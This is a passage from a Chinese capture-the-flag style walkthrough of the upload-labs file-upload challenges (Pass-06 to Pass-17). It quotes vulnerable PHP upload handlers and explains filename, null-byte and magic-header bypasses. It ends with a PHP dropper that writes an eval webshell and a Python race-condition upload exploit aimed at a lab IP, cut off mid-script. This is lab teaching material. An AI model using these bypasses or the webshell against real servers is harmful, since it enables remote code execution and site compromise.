class="code"><pre><span class="line">   　　test.asp.</span><br><span class="line">   　　test.asp(空格)</span><br><span class="line">   　　test.php:1.jpg</span><br><span class="line">   　　test.php:: $DATA</span><br></pre></td></tr></table></figure><p>但是在此处代码过滤了’.’和’::$DATA’所以我们只能使用中间那两种方式。<br>注: 会被windows系统自动去掉不符合规则符号后面的内容<br>在此处使用burp抓包修改上传即可<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.14.55.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.15.09.png" alt="image"></p><h3 id="0x07-Pass-07"><a href="#0x07-Pass-07" class="headerlink" title="0x07 Pass-07"></a>0x07 Pass-07</h3><p>此题bypass上传的原理与Pass-06相同，此处我们尝试下上传test.php .这种格式的文件，这种格式的文件在上传到Windows上之后文件中最后一个点会被去掉，所以你访问<code>test.php .</code>和访问<code>test.php</code>的效果是一样的。<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.36.04.png" alt="image"></p><h3 id="0x08-Pass-08"><a href="#0x08-Pass-08" class="headerlink" title="0x08 Pass-08"></a>0x08 Pass-08</h3><p>此题发现相较于Pass-07而言对<code>::$DATA</code>没有进行过滤，所以原理已经在Pass-06讲过了，在此处我们直接上传<code>test.php:: $DATA</code><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.45.43.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.47.38.png" alt="image"></p><h3 id="0x09-Pass-09"><a href="#0x09-Pass-09" class="headerlink" title="0x09 Pass-09"></a>0x09 Pass-09</h3><p>此题相较于Pass-07就多了下面这一行代码，所以我们可以采用与上原理相同的方式，构造<code>test.php. .</code>进行上传绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%881.56.55.png" alt="image"></p><h3 id="0x10-Pass-10"><a href="#0x10-Pass-10" class="headerlink" title="0x10 Pass-10"></a>0x10 Pass-10</h3><p>首先分析下代码，可以看到问题出现在第8行的<code>str_ireplace()</code>函数，此函数在此的作用是对<code>$file_name</code>变量中含有<code>$deny_ext</code>内容的部分替换为空，但是此操作只执行一次。“只执行一次”就是问题所在，如果我们上传类似<code>test.pphphp</code>这样的文件，上传后文件会自动被修改为<code>test.php</code>进而成功上传shell。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.12.33.png" alt="image"><br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%882.14.07.png" alt="image"></p><h3 id="0x11-Pass-11"><a href="#0x11-Pass-11" class="headerlink" title="0x11 Pass-11"></a>0x11 Pass-11</h3><p>分析代码发现最终返回的图片链接是“存储路径名+重命名后的文件名”，看到这个我们就可以联想到使用%00截断路径。<br>我们首先修改参数为<code>index.php?save_path=../upload/test.php%00</code><br>；其次修改我们的<code>test.php</code>为<code>test.jpg</code>然后上传即可。<br>注: 此处应具有新建文件夹的权限，如果没有会报错并导致上传失败<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    <span class="comment">//substr()是返回从start参数开始的字符串的一部分</span></span><br><span class="line">    <span class="comment">//strrpos()是查找字符串在另一字符串中最后一次出现的位置</span></span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="0x12-Pass-12"><a href="#0x12-Pass-12" class="headerlink" title="0x12 Pass-12"></a>0x12 Pass-12</h3><p>此题diff了一下，发现代码与Pass-11中的是一摸一样的，想换换花样的话在此处我们可以使用0x00截断。</p><p>%00和0x00截断的原理都是一样的，即系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。</p><h3 id="0x13-Pass-13"><a href="#0x13-Pass-13" class="headerlink" title="0x13 Pass-13"></a>0x13 Pass-13</h3><p>分析下代码，发现此处就是对文件头进行了解析，此时只需要上传图片马或者在test.php文件的开头加上GIF89a即可。</p><p>多扯一句，图片马的制作就是将你的一句话木马追加到一张图片类型文件的后面。</p><p>此题的目的是上传，并不是getshell，所以到此就结束了，要想getshell还得配合文件解析漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8810.56.46.png" alt="image"></p><h3 id="0x14-Pass-14"><a href="#0x14-Pass-14" class="headerlink" title="0x14 Pass-14"></a>0x14 Pass-14</h3><p>分析一下代码，虽然写的不一样了，但是跟上一题差不多。所以同理可得</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        <span class="comment">//getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息</span></span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        <span class="comment">//image_type_to_extension()根据给定的常量 IMAGETYPE_XXX 返回后缀名</span></span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-17%20%E4%B8%8B%E5%8D%8811.14.44.png" alt="image"></p><h3 id="0x15-Pass-15"><a href="#0x15-Pass-15" class="headerlink" title="0x15 Pass-15"></a>0x15 Pass-15</h3><p>分析一下代码，关键在于<code>exif_imagetype()</code>函数，这个函数的意思是读取一个图像的第一个字节并检查其签名。注意此处只检测图像的第一个字节。所以在此处我们在上一题使用的方法依旧可以生效</p><p>Like</p><p>JPG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FF D8 FF E0 00 10 4A 46 49 46</span><br></pre></td></tr></table></figure></p><p>GIF<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47 49 46 38 39 61</span><br></pre></td></tr></table></figure></p><p>(相当于文本的GIF89a)</p><p>PNG<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x16-Pass-16"><a href="#0x16-Pass-16" class="headerlink" title="0x16 Pass-16"></a>0x16 Pass-16</h3><p>分析代码发现此处对图片进行了二次渲染比对，这里的原理是对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行。</p><p>此处给一个已经构造的好的包含<code>&lt;?phpinfo();?&gt;</code>的图片，<a href="https://pan.baidu.com/s/1xzHZYPHsgsI0V5CNZsGpLQ" target="_blank" rel="noopener">PoC</a>  密码:o34g</p><h3 id="0x17-Pass-17"><a href="#0x17-Pass-17" class="headerlink" title="0x17 Pass-17"></a>0x17 Pass-17</h3><p>分析下代码发现多了<code>unlink()</code>函数，这个函数的作用是删除指定文件，看到这个基本就可以确定这是一个条件竞争写shell了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先先上传一个php脚本，内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &apos;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = <span class="string">"http://172.16.5.129/upload/shell.php"</span></span><br><span class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-17/index.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'try to call uploaded file...'</span>)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">"[*]create file info.php success"</span>)</span><br><span class="line">            <span class="comment">#os._exit(0)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        hh = hackhttp.hackhttp()</span><br><span class="line">        raw = <span class="string">"""</span></span><br><span class="line"><span class="string">        POST /Pass-17/index.php?action=show_code HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.16.5.129</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://172.16.5.129/Pass-17/index.php?action=show_code</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7566250541346608691122113904</span></span><br><span class="line"><span class="string">Content-Length: 413</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------7566250541346608691122113904</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="upload_file"; filename="shell.php"</span></span><br><span class="line"><span class="string">Content-Type: text/php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php fputs(fopen("./info.php", "w"), '&lt;?php @eval($_POST["drops"]) ?&gt;'); ?&gt;</span></span><br><span class="line"><span class="string">-----------------------------7566250541346608691122113904</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上传</span></span><br><span class="line"><span class="string">-----------------------------7566250541346608691122113904--</span></span><br><span class="line"><span class="string">        